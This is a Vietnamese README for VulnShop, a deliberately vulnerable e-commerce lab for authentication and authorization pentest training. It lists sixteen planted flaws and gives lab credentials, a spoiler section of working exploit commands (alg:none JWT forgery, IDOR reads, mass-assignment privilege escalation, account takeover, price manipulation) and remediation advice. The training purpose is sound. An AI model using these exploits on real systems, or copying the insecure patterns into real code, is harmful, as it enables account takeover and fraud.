# 🛒 VulnShop — AuthN/AuthZ Pentest Lab

Một website bán hàng (e-commerce) **đầy đủ chức năng, giao diện đẹp**, nhưng được cài cắm
**nhiều lỗ hổng Authentication & Authorization** để luyện pentest.

> ⚠️ **CHỈ dùng cho đào tạo security có phép.** Toàn bộ dữ liệu là giả, không có giao dịch thật.
> KHÔNG deploy ra Internet. Theo yêu cầu: **không có lỗi SQL Injection** (app không dùng database).

## Chạy lab

```bash
cd vuln-shop-lab
npm install
npm start
# mở http://localhost:3000
```

## Tài khoản mẫu

| Username  | Password          | Role    |
|-----------|-------------------|---------|
| `admin`   | `SuperAdmin!2021` | admin   |
| `alice`   | `password1`       | user    |
| `bob`     | `qwerty123`       | user    |
| `manager` | `Manager#99`      | manager |

---

## 🎯 Danh sách lỗ hổng (16)

### A. Authentication
| # | Lỗ hổng | Vị trí |
|---|---------|--------|
| 1 | **Weak JWT secret** (`shop-secret-2021`, hard-code) | `server.js` `JWT_SECRET` |
| 2 | **JWT `alg:none` accepted** → forge token không cần ký | `verifyToken()` |
| 3 | **JWT expiry không được enforce** → token sống mãi | `verifyToken()` |
| 4 | **User enumeration** (thông báo lỗi khác nhau) | `POST /api/login` |
| 5 | **No rate limiting / lockout** → brute force thoải mái | `POST /api/login` |
| 6 | **Token trong cookie non-HttpOnly + localStorage** → XSS đánh cắp | `/login`, `app.js` |
| 7 | **Predictable password-reset token** (`reset-<id>-<date>`) + trả về trong response | `/forgot-password` |
| 8 | **Reset không gắn danh tính, không hết hạn, không kiểm tra** | `/reset-password` |

### B. Authorization
| # | Lỗ hổng | Vị trí |
|---|---------|--------|
| 9  | **Mass assignment khi đăng ký** → tự set `role:admin`, `balance` | `POST /api/register` |
| 10 | **IDOR — hồ sơ người khác** | `GET /api/users/:id` |
| 11 | **IDOR + mass assignment khi update** → sửa role/balance bất kỳ ai | `PUT /api/users/:id` |
| 12 | **Horizontal privesc — đổi mật khẩu user khác**, không cần mật khẩu cũ | `POST /api/users/:id/change-password` |
| 13 | **Broken function-level authz — liệt kê toàn bộ user (PII)** | `GET /api/users` |
| 14 | **IDOR đơn hàng / invoice** (lộ địa chỉ, thẻ) | `GET /api/orders/:id`, `?userId=`, `/invoice` |
| 15 | **Price manipulation** — server tin `total` từ client | `POST /api/orders` |
| 16 | **Vertical privesc** — admin API không kiểm tra role: header `X-Admin: true`, `?debug=1`, hoặc không cần gì | `GET /api/admin/*`, `DELETE /api/admin/users/:id`, promote |

Phụ: **coupon enumeration** (lộ `VIP50`, `STAFF100` 100%-off) — `GET /api/coupons/:code`; **client-side-only access control** (link Admin chỉ bị `display:none`).

---


## 🖥️ Khám phá ngay trên giao diện (không cần Burp)

- **Search:** gõ vào ô tìm kiếm trên header (từ bất kỳ trang nào) → tự nhảy về Store và lọc sản phẩm theo tên/danh mục; có nút *Clear search* khi không có kết quả.
- **My Orders → View invoice / Look up an invoice:** mở modal hiện đầy đủ hoá đơn (tên, email, địa chỉ, 4 số thẻ). Ô *Look up an invoice* cho nhập **Order ID bất kỳ** — thử `5001`, `5002`, `5003` (đơn của người khác) để thấy **IDOR** trực tiếp.
- **Admin dashboard** (đăng nhập `admin / SuperAdmin!2021`, hoặc ép URL `#admin` dù là user thường): 4 tab
  - *Overview* — số liệu, tải bằng header `X-Admin: true` (không cần token).
  - *Users* — bảng user **lộ cả plaintext password**; đổi `role`/`balance` rồi Save (mass assignment), hoặc Delete.
  - *Products* — sửa giá/tồn kho, xoá, thêm sản phẩm mới — API `/api/products` không cần auth.
  - *Orders* — toàn bộ đơn của mọi user.
  - Banner đỏ trong trang ghi rõ từng API và cách bypass tương ứng.

## 🔓 Lời giải (spoiler)

<details><summary>Bấm để xem các bước khai thác</summary>

**#2 Forge admin bằng JWT alg:none** (không cần mật khẩu):
```bash
python3 - <<'PY'
import base64,json
b=lambda o:base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b'=').decode()
print(b({"alg":"none","typ":"JWT"})+"."+b({"sub":1,"username":"admin","role":"admin"})+".")
PY
curl localhost:3000/api/me -H "Authorization: Bearer <forged>"
```

**#9 Mass assignment → admin ngay khi đăng ký:**
```bash
curl -X POST localhost:3000/api/register -H 'Content-Type: application/json' \
  -d '{"username":"evil","password":"p","role":"admin","balance":99999}'
```

**#10/#14 IDOR:** đăng nhập `alice`, đọc đơn của người khác:
```bash
curl localhost:3000/api/orders/5002 -H "Authorization: Bearer $TOK"
curl "localhost:3000/api/orders?userId=1" -H "Authorization: Bearer $TOK"
curl localhost:3000/api/users/1 -H "Authorization: Bearer $TOK"
```

**#12 Chiếm tài khoản bob (horizontal):**
```bash
curl -X POST localhost:3000/api/users/3/change-password -H "Authorization: Bearer $TOK" \
  -H 'Content-Type: application/json' -d '{"newPassword":"pwned"}'
```

**#15 Mua hàng giá 1$:**
```bash
curl -X POST localhost:3000/api/orders -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
  -d '{"items":[{"id":103,"name":"Pulse Smartwatch 2","price":1,"qty":1}],"total":1}'
```

**#16 Admin không cần đăng nhập:**
```bash
curl localhost:3000/api/admin/stats -H 'X-Admin: true'
curl "localhost:3000/api/admin/users?debug=1"   # lộ cả plaintext password
```

**#7/#8 Reset mật khẩu admin:**
```bash
curl -X POST localhost:3000/api/forgot-password -d '{"email":"admin@vulnshop.lab"}' -H 'Content-Type: application/json'
# -> token "reset-1-2026-10-21" (đoán được); rồi:
curl -X POST localhost:3000/api/reset-password -H 'Content-Type: application/json' \
  -d '{"token":"reset-1-2026-10-21","newPassword":"owned"}'
```
</details>

---

## 🛠️ Cách fix (dùng để dạy remediation)
- JWT: secret mạnh + từ env, whitelist `alg` (chỉ HS256/RS256), **enforce `exp`**, verify chữ ký.
- Mỗi endpoint: kiểm tra **ownership** (`resource.userId === req.user.id`) và **role** server-side.
- Whitelist field khi create/update (cấm `role`, `balance`, `id`).
- Server **tự tính total** từ catalog, không tin client.
- Login: thông báo lỗi chung chung, thêm rate-limit/lockout.
- Reset token: random (`crypto.randomBytes`), có hạn, gửi qua email, không trả trong response.
- Cookie `HttpOnly; Secure; SameSite=Strict`.

## Cấu trúc
```
vuln-shop-lab/
├── server.js            # API + JWT tự viết + toàn bộ lỗ hổng (có comment VULN:)
├── public/
│   ├── index.html       # storefront SPA
│   ├── styles.css       # giao diện tối, hiện đại
│   └── app.js           # router, cart, auth, admin UI
└── README.md
```
Mỗi lỗ hổng trong `server.js` được đánh dấu bằng comment `// VULN:` để tiện đối chiếu khi dạy.
